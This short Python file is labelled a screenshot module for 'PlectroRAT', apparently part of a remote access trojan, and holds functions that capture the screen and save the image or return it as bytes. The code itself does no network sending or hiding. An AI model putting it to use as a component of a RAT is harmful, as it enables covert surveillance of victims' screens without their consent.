

# Screenshot module for PlectroRAT
# This module captures the current screen and can return the image as bytes or save to file

import pyautogui
import io
from PIL import Image

def capture_screenshot():
    # Capture the screenshot using pyautogui
    screenshot = pyautogui.screenshot()
    return screenshot

def save_screenshot(path="screenshot.png"):
    screenshot = capture_screenshot()
    screenshot.save(path)

def get_screenshot_bytes(format="PNG"):
    screenshot = capture_screenshot()
    byte_stream = io.BytesIO()
    screenshot.save(byte_stream, format=format)
    return byte_stream.getvalue()